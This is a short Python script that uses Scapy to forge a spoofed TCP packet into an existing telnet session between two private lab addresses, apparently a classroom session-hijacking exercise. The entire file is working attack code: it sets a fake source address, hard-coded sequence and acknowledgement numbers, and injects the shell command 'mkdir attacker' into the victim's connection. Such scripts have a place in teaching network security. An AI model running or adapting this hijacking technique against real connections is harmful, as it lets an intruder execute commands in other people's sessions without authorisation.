import sys
from scapy.all import *

print("sending session hijacking packet...")
IPLayer = IP (src="10.10.10.190", dst = "10.10.10.188")
TCPLayer = TCP (sport=33736, dport=23, flags="A", seq=1124946692, ack=199882474)
Data = "\r mkdir attacker \r"
pkt=IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)



